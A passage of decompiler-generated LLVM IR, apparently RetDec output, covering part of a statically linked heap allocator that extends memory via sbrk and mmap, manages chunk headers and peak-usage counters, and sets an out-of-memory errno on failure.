  %v7_804a6ed = icmp sgt i32 %v1_804a6e1, %v1_804a6e7
  br i1 %v7_804a6ed, label %dec_label_pc_804a6ef, label %dec_label_pc_804a6f4

dec_label_pc_804a6ef:                             ; preds = %dec_label_pc_804a6d6
  store i32 %v1_804a6e1, i32* @global_var_8054958.47, align 8
  br label %dec_label_pc_804a6f4

dec_label_pc_804a6f4:                             ; preds = %dec_label_pc_804a6d6, %dec_label_pc_804a6ef
  %v0_804a6f4 = load i32, i32* @global_var_8054964.48, align 4
  %v1_804a6f9 = load i32, i32* @ebx, align 4
  %v2_804a6f9 = add i32 %v1_804a6f9, %v0_804a6f4
  store i32 %v2_804a6f9, i32* %eax.global-to-local, align 4
  store i32 %v2_804a6f9, i32* @global_var_8054964.48, align 4
  %v1_804a700 = load i32, i32* @global_var_8054970.49, align 16
  %tmp130 = icmp ugt i32 %v2_804a6f9, %v1_804a700
  br i1 %tmp130, label %dec_label_pc_804a708, label %dec_label_pc_804a70d

dec_label_pc_804a708:                             ; preds = %dec_label_pc_804a6f4
  store i32 %v2_804a6f9, i32* @global_var_8054970.49, align 16
  br label %dec_label_pc_804a70d

dec_label_pc_804a70d:                             ; preds = %dec_label_pc_804a6f4, %dec_label_pc_804a708
  %v1_804a70d = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a70d = add i32 %v1_804a70d, %v2_804a6f9
  store i32 %v2_804a70d, i32* %eax.global-to-local, align 4
  %v1_804a713 = load i32, i32* @global_var_8054974.51, align 4
  %tmp131 = icmp ugt i32 %v2_804a70d, %v1_804a713
  br i1 %tmp131, label %dec_label_pc_804a71f, label %dec_label_pc_804a370

dec_label_pc_804a71f:                             ; preds = %dec_label_pc_804a70d
  store i32 %v2_804a70d, i32* @global_var_8054974.51, align 4
  br label %dec_label_pc_804a370

dec_label_pc_804a729:                             ; preds = %dec_label_pc_804a684, %dec_label_pc_804a698.dec_label_pc_804a729_crit_edge, %dec_label_pc_804a673, %dec_label_pc_804a65c
  %v0_804a729 = phi i32 [ %v0_804a729.pre, %dec_label_pc_804a698.dec_label_pc_804a729_crit_edge ], [ %v0_804a5f1, %dec_label_pc_804a673 ], [ %v0_804a5f1, %dec_label_pc_804a684 ], [ %v0_804a5f1, %dec_label_pc_804a65c ]
  store i32 %v0_804a729, i32* %eax.global-to-local, align 4
  %v1_804a732 = add i32 %v0_804a729, 4
  %v2_804a732 = inttoptr i32 %v1_804a732 to i32*
  %v3_804a732 = load i32, i32* %v2_804a732, align 4
  %v1_804a73c = and i32 %v3_804a732, -4
  %v2_804a73c = icmp eq i32 %v1_804a73c, 0
  store i32 %v1_804a73c, i32* @ebp, align 4
  %v1_804a73f = load i32, i32* @global_var_8054948.52, align 8
  %v2_804a73f = add i32 %v1_804a73f, %v1_804a5fb
  store i32 %v2_804a73f, i32* %eax.global-to-local, align 4
  %v0_804a745 = load i8, i8* @global_var_8054960.53, align 32
  %v1_804a745 = urem i8 %v0_804a745, 2
  %v2_804a745 = icmp eq i8 %v1_804a745, 0
  br i1 %v2_804a745, label %dec_label_pc_804a750, label %dec_label_pc_804a74e

dec_label_pc_804a74e:                             ; preds = %dec_label_pc_804a729
  %v2_804a74e = sub i32 %v2_804a73f, %v1_804a73c
  store i32 %v2_804a74e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a750

dec_label_pc_804a750:                             ; preds = %dec_label_pc_804a729, %dec_label_pc_804a74e
  %v0_804a754 = phi i32 [ %v2_804a73f, %dec_label_pc_804a729 ], [ %v2_804a74e, %dec_label_pc_804a74e ]
  %v5_804a754 = add i32 %v0_804a754, %v1_804a65c
  store i32 %v5_804a754, i32* %eax.global-to-local, align 4
  %v1_804a758 = sub i32 0, %v0_804a628
  store i32 %v1_804a758, i32* @edx, align 4
  %v2_804a760 = and i32 %v5_804a754, %v1_804a758
  store i32 %v2_804a760, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_804a760, 1
  br i1 %tmp88, label %dec_label_pc_804a77a, label %dec_label_pc_804a764

dec_label_pc_804a764:                             ; preds = %dec_label_pc_804a750
  store i32 %v2_804a760, i32* %stack_var_-92, align 4
  %v1_804a768 = call i32 @__GI_sbrk(i32 %v2_804a760)
  store i32 %v1_804a768, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_804a768, i32* @ebx, align 4
  %v10_804a775 = icmp eq i32 %v1_804a768, -1
  %v1_804a778 = icmp eq i1 %v10_804a775, false
  br i1 %v1_804a778, label %dec_label_pc_804a7d0.dec_label_pc_804a7d9_crit_edge, label %dec_label_pc_804a764.dec_label_pc_804a77a_crit_edge

dec_label_pc_804a764.dec_label_pc_804a77a_crit_edge: ; preds = %dec_label_pc_804a764
  %v0_804a77a.pre = load i8, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a77a

dec_label_pc_804a77a:                             ; preds = %dec_label_pc_804a764.dec_label_pc_804a77a_crit_edge, %dec_label_pc_804a750
  %v0_804a7a6 = phi i32 [ -1, %dec_label_pc_804a764.dec_label_pc_804a77a_crit_edge ], [ %v1_804a758, %dec_label_pc_804a750 ]
  %v0_804a77a = phi i8 [ %v0_804a77a.pre, %dec_label_pc_804a764.dec_label_pc_804a77a_crit_edge ], [ %v0_804a745, %dec_label_pc_804a750 ]
  %v1_804a77a = urem i8 %v0_804a77a, 2
  %v2_804a77a = icmp eq i8 %v1_804a77a, 0
  br i1 %v2_804a77a, label %dec_label_pc_804a77a.dec_label_pc_804a78f_crit_edge, label %dec_label_pc_804a783

dec_label_pc_804a77a.dec_label_pc_804a78f_crit_edge: ; preds = %dec_label_pc_804a77a
  %v0_804a78f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a78f

dec_label_pc_804a783:                             ; preds = %dec_label_pc_804a77a
  %v2_804a787 = add i32 %v1_804a73c, %v1_804a65c
  store i32 %v2_804a787, i32* %eax.global-to-local, align 4
  %v0_804a789 = load i32, i32* @esi, align 4
  %v2_804a789 = add i32 %v0_804a789, %v2_804a787
  %v5_804a78b = and i32 %v2_804a789, %v1_804a758
  store i32 %v5_804a78b, i32* @esi, align 4
  br label %dec_label_pc_804a78f

dec_label_pc_804a78f:                             ; preds = %dec_label_pc_804a77a.dec_label_pc_804a78f_crit_edge, %dec_label_pc_804a783
  %v0_804a78f = phi i32 [ %v0_804a78f.pre, %dec_label_pc_804a77a.dec_label_pc_804a78f_crit_edge ], [ %v5_804a78b, %dec_label_pc_804a783 ]
  %tmp132 = icmp ult i32 %v0_804a78f, 1048576
  br i1 %tmp132, label %dec_label_pc_804a797, label %dec_label_pc_804a79c

dec_label_pc_804a797:                             ; preds = %dec_label_pc_804a78f
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804a79c

dec_label_pc_804a79c:                             ; preds = %dec_label_pc_804a78f, %dec_label_pc_804a797
  %v0_804a7b0 = phi i32 [ %v0_804a78f, %dec_label_pc_804a78f ], [ 1048576, %dec_label_pc_804a797 ]
  %tmp133 = icmp ugt i32 %v0_804a7b0, %v1_804a686
  br i1 %tmp133, label %dec_label_pc_804a7a6, label %dec_label_pc_804a9de

dec_label_pc_804a7a6:                             ; preds = %dec_label_pc_804a79c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a7b3 = call i32 @mmap(i32 0, i32 %v0_804a7b0, i32 3, i32 34, i32 0, i32 0, i32 %v0_804a7a6, i32 %v0_804a7a6)
  store i32 %v8_804a7b3, i32* %eax.global-to-local, align 4
  store i32 %v8_804a7b3, i32* @ebx, align 4
  %v10_804a7bd = icmp eq i32 %v8_804a7b3, -1
  br i1 %v10_804a7bd, label %dec_label_pc_804a9de, label %dec_label_pc_804a7d0.thread

dec_label_pc_804a7d0.thread:                      ; preds = %dec_label_pc_804a7a6
  %v0_804a7c6 = load i8, i8* @global_var_8054960.53, align 1
  %v2_804a7c6 = and i8 %v0_804a7c6, -2
  store i8 %v2_804a7c6, i8* @global_var_8054960.53, align 32
  %v1_804a7cd = load i32, i32* @esi, align 4
  %v2_804a7cd = add i32 %v1_804a7cd, %v8_804a7b3
  store i32 %v2_804a7cd, i32* @edx, align 4
  br label %dec_label_pc_804a7d9

dec_label_pc_804a7d0.dec_label_pc_804a7d9_crit_edge: ; preds = %dec_label_pc_804a764
  %v1_804a7dd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a7d9

dec_label_pc_804a7d9:                             ; preds = %dec_label_pc_804a7d0.dec_label_pc_804a7d9_crit_edge, %dec_label_pc_804a7d0.thread
  %v1_804a7dd = phi i32 [ %v1_804a7cd, %dec_label_pc_804a7d0.thread ], [ %v1_804a7dd.pre, %dec_label_pc_804a7d0.dec_label_pc_804a7d9_crit_edge ]
  %v0_804a8a592 = phi i32 [ %v8_804a7b3, %dec_label_pc_804a7d0.thread ], [ %v1_804a768, %dec_label_pc_804a7d0.dec_label_pc_804a7d9_crit_edge ]
  %v0_804a89791 = phi i32 [ %v2_804a7cd, %dec_label_pc_804a7d0.thread ], [ -1, %dec_label_pc_804a7d0.dec_label_pc_804a7d9_crit_edge ]
  %v0_804a7dd = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a7dd = add i32 %v1_804a7dd, %v0_804a7dd
  store i32 %v2_804a7dd, i32* @global_var_8054968.50, align 8
  %v2_804a7e3 = add i32 %v1_804a73c, %v0_804a729
  store i32 %v2_804a7e3, i32* %ecx.global-to-local, align 4
  %v2_804a7e5 = sub i32 %v0_804a8a592, %v2_804a7e3
  %v7_804a7e5 = icmp ult i32 %v0_804a8a592, %v2_804a7e3
  %v12_804a7e5 = icmp eq i32 %v2_804a7e5, 0
  %v1_804a7e7 = icmp eq i1 %v12_804a7e5, false
  br i1 %v1_804a7e7, label %dec_label_pc_804a800, label %dec_label_pc_804a7e9

dec_label_pc_804a7e9:                             ; preds = %dec_label_pc_804a7d9
  %v10_804a7e9 = icmp eq i32 %v0_804a89791, -1
  %v1_804a7ec = icmp eq i1 %v10_804a7e9, false
  br i1 %v1_804a7ec, label %dec_label_pc_804a800, label %dec_label_pc_804a7ee

dec_label_pc_804a7ee:                             ; preds = %dec_label_pc_804a7e9
  %v2_804a7ee = add i32 %v1_804a7dd, %v1_804a73c
  store i32 %v0_804a729, i32* %ecx.global-to-local, align 4
  %v1_804a7f5 = or i32 %v2_804a7ee, 1
  store i32 %v1_804a7f5, i32* %eax.global-to-local, align 4
  store i32 %v1_804a7f5, i32* %v2_804a732, align 4
  br label %dec_label_pc_804a92d

dec_label_pc_804a800:                             ; preds = %dec_label_pc_804a7e9, %dec_label_pc_804a7d9
  %v0_804a800 = load i8, i8* @global_var_8054960.53, align 1
  %v1_804a800 = sext i8 %v0_804a800 to i32
  store i32 %v1_804a800, i32* %eax.global-to-local, align 4
  %v2_804a805 = urem i8 %v0_804a800, 2
  %v3_804a805 = icmp eq i8 %v2_804a805, 0
  br i1 %v3_804a805, label %dec_label_pc_804a819, label %dec_label_pc_804a809

dec_label_pc_804a809:                             ; preds = %dec_label_pc_804a800
  br i1 %v2_804a73c, label %dec_label_pc_804a819, label %dec_label_pc_804a80d

dec_label_pc_804a80d:                             ; preds = %dec_label_pc_804a809
  %v1_804a80f = icmp eq i1 %v7_804a7e5, false
  br i1 %v1_804a80f, label %dec_label_pc_804a819, label %dec_label_pc_804a811

dec_label_pc_804a811:                             ; preds = %dec_label_pc_804a80d
  %v1_804a811 = and i32 %v1_804a800, -2
  %v4_804a811 = trunc i32 %v1_804a811 to i8
  store i32 %v1_804a811, i32* %eax.global-to-local, align 4
  store i8 %v4_804a811, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a819

dec_label_pc_804a819:                             ; preds = %dec_label_pc_804a80d, %dec_label_pc_804a809, %dec_label_pc_804a800, %dec_label_pc_804a811
  %v0_804a819 = phi i8 [ %v0_804a800, %dec_label_pc_804a80d ], [ %v0_804a800, %dec_label_pc_804a809 ], [ %v0_804a800, %dec_label_pc_804a800 ], [ %v4_804a811, %dec_label_pc_804a811 ]
  %v1_804a819 = urem i8 %v0_804a819, 2
  %v2_804a819 = icmp eq i8 %v1_804a819, 0
  br i1 %v2_804a819, label %dec_label_pc_804a897, label %dec_label_pc_804a822

dec_label_pc_804a822:                             ; preds = %dec_label_pc_804a819
  br i1 %v2_804a73c, label %dec_label_pc_804a830, label %dec_label_pc_804a826

dec_label_pc_804a826:                             ; preds = %dec_label_pc_804a822
  store i32 %v2_804a7e5, i32* %eax.global-to-local, align 4
  %v2_804a82a = add i32 %v2_804a7dd, %v2_804a7e5
  store i32 %v2_804a82a, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804a830

dec_label_pc_804a830:                             ; preds = %dec_label_pc_804a822, %dec_label_pc_804a826
  %v1_804a832 = urem i32 %v0_804a8a592, 8
  %v2_804a832 = icmp eq i32 %v1_804a832, 0
  store i32 %v1_804a832, i32* %edx.global-to-local, align 4
  %v1_804a835 = icmp eq i1 %v2_804a832, false
  br i1 %v1_804a835, label %dec_label_pc_804a83d, label %dec_label_pc_804a837

dec_label_pc_804a837:                             ; preds = %dec_label_pc_804a830
  store i32 %v0_804a8a592, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a847

dec_label_pc_804a83d:                             ; preds = %dec_label_pc_804a830
  %v2_804a842 = sub nsw i32 8, %v1_804a832
  store i32 %v2_804a842, i32* %eax.global-to-local, align 4
  %v2_804a844 = add i32 %v2_804a842, %v0_804a8a592
  store i32 %v2_804a844, i32* @edi, align 4
  br label %dec_label_pc_804a847

dec_label_pc_804a847:                             ; preds = %dec_label_pc_804a837, %dec_label_pc_804a83d
  %v0_804a84a = phi i32 [ 0, %dec_label_pc_804a837 ], [ %v2_804a842, %dec_label_pc_804a83d ]
  %v2_804a847 = add i32 %v1_804a7dd, %v0_804a8a592
  %v2_804a84a = add i32 %v0_804a84a, %v1_804a73c
  store i32 %v2_804a84a, i32* %ecx.global-to-local, align 4
  %v2_804a853 = add i32 %v2_804a84a, %v2_804a847
  store i32 %v2_804a853, i32* %edx.global-to-local, align 4
  %v2_804a859 = add i32 %v2_804a853, %v1_804a65c
  %v5_804a85c = and i32 %v2_804a859, %v1_804a758
  %v2_804a863 = sub i32 %v5_804a85c, %v2_804a853
  store i32 %v2_804a863, i32* %eax.global-to-local, align 4
  %v2_804a865 = add i32 %v2_804a863, %v2_804a84a
  store i32 %v2_804a865, i32* @esi, align 4
  store i32 %v2_804a865, i32* %stack_var_-92, align 4
  %v1_804a869 = call i32 @__GI_sbrk(i32 %v2_804a865)
  store i32 %v1_804a869, i32* %eax.global-to-local, align 4
  store i32 %v1_804a869, i32* @edx, align 4
  %v10_804a873 = icmp eq i32 %v1_804a869, -1
  %v1_804a876 = icmp eq i1 %v10_804a873, false
  br i1 %v1_804a876, label %dec_label_pc_804a886, label %dec_label_pc_804a878

dec_label_pc_804a878:                             ; preds = %dec_label_pc_804a847
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804a87d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a87d, i32* %eax.global-to-local, align 4
  store i32 %v1_804a87d, i32* @edx, align 4
  br label %dec_label_pc_804a8ba

dec_label_pc_804a886:                             ; preds = %dec_label_pc_804a847
  %v1_804a886 = load i32, i32* @ebx, align 4
  %v7_804a886 = icmp ult i32 %v1_804a869, %v1_804a886
  %v1_804a888 = icmp eq i1 %v7_804a886, false
  br i1 %v1_804a888, label %dec_label_pc_804a8bf, label %dec_label_pc_804a88a

dec_label_pc_804a88a:                             ; preds = %dec_label_pc_804a886
  %v0_804a88a = load i8, i8* @global_var_8054960.53, align 1
  %v2_804a88a = and i8 %v0_804a88a, -2
  store i8 %v2_804a88a, i8* @global_var_8054960.53, align 32
  store i32 %v2_804a847, i32* @edx, align 4
  br label %dec_label_pc_804a89e

dec_label_pc_804a897:                             ; preds = %dec_label_pc_804a819
  %v10_804a897 = icmp eq i32 %v0_804a89791, -1
  br i1 %v10_804a897, label %dec_label_pc_804a8a2, label %dec_label_pc_804a89c

dec_label_pc_804a89c:                             ; preds = %dec_label_pc_804a897
  store i32 %v0_804a8a592, i32* @edi, align 4
  br label %dec_label_pc_804a89e

dec_label_pc_804a89e:                             ; preds = %dec_label_pc_804a88a, %dec_label_pc_804a89c
  %v0_804a8bf49 = phi i32 [ %v2_804a847, %dec_label_pc_804a88a ], [ %v0_804a89791, %dec_label_pc_804a89c ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804a8bf

dec_label_pc_804a8a2:                             ; preds = %dec_label_pc_804a897
  store i32 %v0_804a8a592, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804a8a9 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a8a9, i32* @edx, align 4
  %v1_804a8b0 = load i32, i32* @ebx, align 4
  %v2_804a8b0 = sub i32 %v1_804a8a9, %v1_804a8b0
  %v1_804a8b2 = load i32, i32* @esi, align 4
  %v2_804a8b2 = sub i32 %v2_804a8b0, %v1_804a8b2
  store i32 %v2_804a8b2, i32* %eax.global-to-local, align 4
  %v0_804a8b4 = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a8b4 = add i32 %v0_804a8b4, %v2_804a8b2
  store i32 %v2_804a8b4, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804a8ba

dec_label_pc_804a8ba:                             ; preds = %dec_label_pc_804a878, %dec_label_pc_804a8a2
  %v0_804a8bf48 = phi i32 [ %v1_804a87d, %dec_label_pc_804a878 ], [ %v1_804a8a9, %dec_label_pc_804a8a2 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804a8bf

dec_label_pc_804a8bf:                             ; preds = %dec_label_pc_804a886, %dec_label_pc_804a89e, %dec_label_pc_804a8ba
  %v0_804a8c4 = phi i32 [ %v1_804a869, %dec_label_pc_804a886 ], [ %v0_804a8bf49, %dec_label_pc_804a89e ], [ %v0_804a8bf48, %dec_label_pc_804a8ba ]
  %v10_804a8bf = icmp eq i32 %v0_804a8c4, -1
  br i1 %v10_804a8bf, label %dec_label_pc_804a92d, label %dec_label_pc_804a8c4

dec_label_pc_804a8c4:                             ; preds = %dec_label_pc_804a8bf
  %v1_804a8c4 = load i32, i32* @edi, align 4
  %v2_804a8c4 = sub i32 %v0_804a8c4, %v1_804a8c4
  store i32 %v2_804a8c4, i32* @edx, align 4
  store i32 %v1_804a8c4, i32* @global_var_805462c.38, align 4
  %v1_804a8cc = load i32, i32* @esi, align 4
  %v2_804a8cc = add i32 %v1_804a8cc, %v2_804a8c4
  %v1_804a8cf = or i32 %v2_804a8cc, 1
  store i32 %v1_804a8cf, i32* %eax.global-to-local, align 4
  %v2_804a8d2 = add i32 %v1_804a8c4, 4
  %v3_804a8d2 = inttoptr i32 %v2_804a8d2 to i32*
  store i32 %v1_804a8cf, i32* %v3_804a8d2, align 4
  %v0_804a8d5 = load i32, i32* @global_var_8054968.50, align 8
  %v1_804a8d5 = load i32, i32* @esi, align 4
  %v2_804a8d5 = add i32 %v1_804a8d5, %v0_804a8d5
  store i32 %v2_804a8d5, i32* @global_var_8054968.50, align 8
  br i1 %v2_804a73c, label %dec_label_pc_804a92d, label %dec_label_pc_804a8df

dec_label_pc_804a8df:                             ; preds = %dec_label_pc_804a8c4
  %v1_804a8df = add i32 %v1_804a73c, -12
  store i32 %v0_804a729, i32* %ecx.global-to-local, align 4
  %v1_804a8e6 = and i32 %v1_804a8df, -8
  store i32 %v1_804a8e6, i32* %eax.global-to-local, align 4
  %v1_804a8eb = or i32 %v1_804a8e6, 1
  store i32 %v1_804a8eb, i32* @edx, align 4
  %v5_804a8ee = icmp ult i32 %v1_804a8e6, 15
  store i32 %v1_804a8eb, i32* %v2_804a732, align 4
  %v0_804a8f4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a8f4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a8f4 = add i32 %v0_804a8f4, 4
  %v3_804a8f4 = add i32 %v2_804a8f4, %v1_804a8f4
  %v4_804a8f4 = inttoptr i32 %v3_804a8f4 to i32*
  store i32 5, i32* %v4_804a8f4, align 4
  %v0_804a8fc = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a8fc = load i32, i32* %eax.global-to-local, align 4
  %v2_804a8fc = add i32 %v0_804a8fc, 8
  %v3_804a8fc = add i32 %v2_804a8fc, %v1_804a8fc
  %v4_804a8fc = inttoptr i32 %v3_804a8fc to i32*
  store i32 5, i32* %v4_804a8fc, align 4
  br i1 %v5_804a8ee, label %dec_label_pc_804a92d, label %dec_label_pc_804a906

dec_label_pc_804a906:                             ; preds = %dec_label_pc_804a8df
  %v0_804a909 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a90b = add i32 %v0_804a909, 8
  store i32 %v1_804a90b, i32* %eax.global-to-local, align 4
  %v0_804a90e = load i32, i32* @global_var_8054944.54, align 4
  store i32 %v0_804a90e, i32* @ebx, align 4
  store i32 %v1_804a90b, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8054944.54, align 4
  %v1_804a91f = call i32 @free(i32 %v1_804a90b)
  store i32 %v1_804a91f, i32* %eax.global-to-local, align 4
  %v0_804a924 = load i32, i32* @ebx, align 4
  store i32 %v0_804a924, i32* @global_var_8054944.54, align 4
  br label %dec_label_pc_804a92d

dec_label_pc_804a92d:                             ; preds = %dec_label_pc_804a8df, %dec_label_pc_804a8c4, %dec_label_pc_804a8bf, %dec_label_pc_804a7ee, %dec_label_pc_804a906
  %v0_804a92d = load i32, i32* @global_var_8054968.50, align 8
  store i32 %v0_804a92d, i32* %eax.global-to-local, align 4
  %v1_804a932 = load i32, i32* @global_var_805496c.55, align 4
  %tmp134 = icmp ugt i32 %v0_804a92d, %v1_804a932
  br i1 %tmp134, label %dec_label_pc_804a93a, label %dec_label_pc_804a93f

dec_label_pc_804a93a:                             ; preds = %dec_label_pc_804a92d
  store i32 %v0_804a92d, i32* @global_var_805496c.55, align 4
  br label %dec_label_pc_804a93f

dec_label_pc_804a93f:                             ; preds = %dec_label_pc_804a92d, %dec_label_pc_804a93a
  %v1_804a93f = load i32, i32* @global_var_8054964.48, align 4
  %v2_804a93f = add i32 %v1_804a93f, %v0_804a92d
  store i32 %v2_804a93f, i32* %eax.global-to-local, align 4
  %v1_804a945 = load i32, i32* @global_var_8054974.51, align 4
  %tmp135 = icmp ugt i32 %v2_804a93f, %v1_804a945
  br i1 %tmp135, label %dec_label_pc_804a94d, label %dec_label_pc_804a952

dec_label_pc_804a94d:                             ; preds = %dec_label_pc_804a93f
  store i32 %v2_804a93f, i32* @global_var_8054974.51, align 4
  br label %dec_label_pc_804a952

dec_label_pc_804a952:                             ; preds = %dec_label_pc_804a93f, %dec_label_pc_804a94d
  %v0_804a952 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804a952, i32* @ebx, align 4
  %v1_804a958 = add i32 %v0_804a952, 4
  %v2_804a958 = inttoptr i32 %v1_804a958 to i32*
  %v3_804a958 = load i32, i32* %v2_804a958, align 4
  %v1_804a95b = and i32 %v3_804a958, -4
  store i32 %v1_804a95b, i32* @ecx, align 4
  %v10_804a95e = icmp ult i32 %v1_804a95b, %v1_804a5fb
  br i1 %v10_804a95e, label %dec_label_pc_804a9de, label %dec_label_pc_804a964

dec_label_pc_804a964:                             ; preds = %dec_label_pc_804a952
  store i32 %v1_804a686, i32* %esi.global-to-local, align 4
  %v2_804a96a = sub i32 %v1_804a95b, %v1_804a686
  store i32 %v2_804a96a, i32* %ecx.global-to-local, align 4
  %v2_804a96c = add i32 %v0_804a952, %v1_804a686
  store i32 %v2_804a96c, i32* @edx, align 4
  %v1_804a96f = or i32 %v1_804a686, 1
  store i32 %v1_804a96f, i32* %eax.global-to-local, align 4
  store i32 %v2_804a96c, i32* @global_var_805462c.38, align 4
  store i32 %v1_804a96f, i32* %v2_804a958, align 4
  %v0_804a97b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a97b

dec_label_pc_804a97b:                             ; preds = %dec_label_pc_804a60c, %dec_label_pc_804a964
  %v0_804a97b = phi i32 [ %v5_804a61f, %dec_label_pc_804a60c ], [ %v0_804a97b.pre, %dec_label_pc_804a964 ]
  %v1_804a97b = or i32 %v0_804a97b, 1
  store i32 %v1_804a97b, i32* @ecx, align 4
  %v0_804a97e = load i32, i32* @ebx, align 4
  %v1_804a97e = add i32 %v0_804a97e, 8
  store i32 %v1_804a97e, i32* %ebx.global-to-local, align 4
  %v1_804a981 = load i32, i32* @edx, align 4
  %v2_804a981 = add i32 %v1_804a981, 4
  %v3_804a981 = inttoptr i32 %v2_804a981 to i32*
  store i32 %v1_804a97b, i32* %v3_804a981, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a986:                             ; preds = %dec_label_pc_804a3c6
  %v5_804a98c = sub i32 %v1_804a3a9, %v1_804a686
  store i32 %v5_804a98c, i32* %eax.global-to-local, align 4
  %v2_804a990 = add i32 %v0_804a474111, %v1_804a686
  store i32 %v2_804a990, i32* @edx, align 4
  %v1_804a994 = or i32 %v1_804a686, 1
  store i32 %v2_804a990, i32* @global_var_8054630.39, align 16
  store i32 %v1_804a994, i32* %v2_804a3a3, align 4
  %v0_804a9a0 = load i32, i32* %eax.global-to-local, align 4
  %v0_804a9a2 = load i32, i32* @edx, align 4
  store i32 %v0_804a9a2, i32* @global_var_805463c.56, align 4
  %v1_804a9a8 = or i32 %v0_804a9a0, 1
  store i32 %v1_804a9a8, i32* @ecx, align 4
  store i32 %v0_804a9a2, i32* @global_var_8054640.41, align 64
  %v1_804a9b1 = add i32 %v0_804a9a2, 8
  %v2_804a9b1 = inttoptr i32 %v1_804a9b1 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a9b1, align 4
  %v0_804a9b8 = load i32, i32* @edx, align 4
  %v1_804a9b8 = add i32 %v0_804a9b8, 12
  %v2_804a9b8 = inttoptr i32 %v1_804a9b8 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a9b8, align 4
  %v0_804a9bf = load i32, i32* @ecx, align 4
  %v1_804a9bf = load i32, i32* @edx, align 4
  %v2_804a9bf = add i32 %v1_804a9bf, 4
  %v3_804a9bf = inttoptr i32 %v2_804a9bf to i32*
  store i32 %v0_804a9bf, i32* %v3_804a9bf, align 4
  %v0_804a9c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a9c2 = load i32, i32* @edx, align 4
  %v3_804a9c2 = add i32 %v1_804a9c2, %v0_804a9c2
  %v4_804a9c2 = inttoptr i32 %v3_804a9c2 to i32*
  store i32 %v0_804a9c2, i32* %v4_804a9c2, align 4
  br label %dec_label_pc_804a9d0

dec_label_pc_804a9c7:                             ; preds = %dec_label_pc_804a3d5
  store i32 %v1_804a686, i32* %ebx.global-to-local, align 4
  %v0_804a9cb = load i32, i32* @ebp, align 4
  %v2_804a9cb = or i32 %v1_804a686, 4
  %v3_804a9cb = add i32 %v0_804a9cb, %v2_804a9cb
  %v4_804a9cb = inttoptr i32 %v3_804a9cb to i32*
  %v5_804a9cb = load i32, i32* %v4_804a9cb, align 4
  %v6_804a9cb = or i32 %v5_804a9cb, 1
  store i32 %v6_804a9cb, i32* %v4_804a9cb, align 4
  br label %dec_label_pc_804a9d0

dec_label_pc_804a9d0:                             ; preds = %dec_label_pc_804a986, %dec_label_pc_804a9c7
  %v0_804a9d0 = load i32, i32* @ebp, align 4
  %v1_804a9d0 = add i32 %v0_804a9d0, 8
  store i32 %v1_804a9d0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a9d5:                             ; preds = %dec_label_pc_804a4c5
  %v1_804a9d5 = load i32, i32* @ebx, align 4
  %v2_804a9d5 = add i32 %v0_804a4d4, 4
  %v3_804a9d5 = add i32 %v2_804a9d5, %v1_804a9d5
  %v4_804a9d5 = inttoptr i32 %v3_804a9d5 to i32*
  %v5_804a9d5 = load i32, i32* %v4_804a9d5, align 4
  %v6_804a9d5 = or i32 %v5_804a9d5, 1
  store i32 %v6_804a9d5, i32* %v4_804a9d5, align 4
  br label %dec_label_pc_804a9da

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a4dd, %dec_label_pc_804a9d5
  %v0_804a9da = load i32, i32* @ecx, align 4
  store i32 %v0_804a9da, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a9de:                             ; preds = %dec_label_pc_804a79c, %dec_label_pc_804a952, %dec_label_pc_804a7a6
  %v0_804a9de = load i32, i32* %stack_var_-92, align 4
  %v1_804a9de = call i32 @__errno_location(i32 %v0_804a9de)
  store i32 %v1_804a9de, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804a9e5 = inttoptr i32 %v1_804a9de to i32*
  store i32 12, i32* %v1_804a9e5, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a9eb:                             ; preds = %dec_label_pc_804a9da, %dec_label_pc_804a9d0, %dec_label_pc_804a97b, %dec_label_pc_804a637, %dec_label_pc_804a5e9, %dec_label_pc_804a370, %dec_label_pc_804a9de
  store i32 %v2_804a2a7, i32* @eax, align 4
  store i32 %v2_804a2a7, i32* %stack_var_-92, align 4
  %v2_804a9f4 = call i32 @__pthread_return_void(i32 %v2_804a2a7, i32 1)
  store i32 %v2_804a9f4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a9fc

dec_label_pc_804a9fc:                             ; preds = %dec_label_pc_804a2c5, %dec_label_pc_804a9eb
  %v0_804a9ff = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804a9ff, i32* %eax.global-to-local, align 4
  %v2_804aa01 = load i32, i32* %stack_var_-16, align 4
